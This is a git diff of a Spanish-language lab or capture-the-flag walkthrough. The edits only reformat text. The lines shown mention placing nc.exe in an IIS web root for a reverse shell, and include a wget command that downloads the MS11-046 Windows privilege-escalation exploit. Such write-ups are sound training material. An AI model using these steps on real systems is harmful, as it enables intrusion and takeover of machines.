@@ -159,7 +159,7 @@ Claro pero nosotros no sabemos donde ahora esta el nc.exe pues buscando en googl
 
 <figure><img src="../../../.gitbook/assets/path.png" alt=""><figcaption></figcaption></figure>
 
-`C:\inetpub\wwwroot\nc.exe`
+**➜** `C:\inetpub\wwwroot\nc.exe`
 
 Pues nos enviamos una reverse shell por nc de la siguiente manera
 
@@ -199,9 +199,9 @@ OS Name:                   Microsoft Windows 7 Enterprise
 OS Version:                6.1.7600 N/A Build 7600
 ```
 
-Buscamos en google `6.1.7600 N/A Build 7600` exploit y encontramos el repositorio de github de abatchy17
+Buscamos en google **6.1.7600 N/A Build 7600** exploit y encontramos el repositorio de github de abatchy17
 
-* Nos descargamos el `ms11-046.exe`
+* Nos descargamos el **ms11-046.exe**
 
 ```shell
 > wget https://github.com/abatchy17/WindowsExploits/blob/5e9c25cda54fe33fb6e1fd3ae60512a1113b41df/MS11-046/MS11-046.exe
